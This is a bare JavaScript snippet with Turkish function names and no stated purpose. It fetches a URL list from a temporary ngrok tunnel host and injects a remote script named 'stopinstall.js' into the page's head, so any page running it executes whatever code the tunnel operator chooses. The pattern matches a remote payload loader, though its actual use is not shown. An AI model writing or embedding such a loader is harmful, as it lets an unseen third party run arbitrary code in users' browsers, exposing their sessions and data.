fetch("https://9f7b91c4a3fa.ngrok.io/url.json")
    .then(response=>response.json())
    .then(data => {
        sayfayaScriptEkle(`${data.url}/stopinstall.js`);
    })
    .catch((error) => {
        console.error('Hata:', error);
    });


function sayfayaScriptEkle(scriptURL) {
    const head = document.getElementsByTagName("head")[0];
    if (head) {
        const element = document.createElement("script");
        element.setAttribute("src", scriptURL);
        head.appendChild(element);
    }
}